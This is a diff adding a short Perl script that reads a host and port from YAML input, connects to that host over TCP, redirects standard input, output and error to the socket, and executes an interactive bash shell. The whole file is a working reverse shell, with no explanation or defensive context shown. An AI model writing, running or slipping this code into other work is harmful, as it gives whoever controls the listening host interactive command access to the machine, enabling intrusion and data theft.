@@ -1,0 +1,28 @@
+#!/usr/bin/env perl
+use strict;
+use warnings;
+use YAML::XS;
+use Socket;
+
+local $/ = undef;
+
+my %param = %{ YAML::XS::Load( <> ) };
+
+my( $host, $port ) = @{$param{argv}};
+$host ||= $ENV{HOSTNAME};
+
+map{ die "param error" unless $_ }( $host, $port );
+
+local $/ = "\n";
+
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if( connect(S,sockaddr_in($port,inet_aton($host))) )
+{
+    open(STDIN,">&S");
+    open(STDOUT,">&S");
+    open(STDERR,">&S");
+    exec("/bin/bash -i");
+};
+
+exit 1;
+
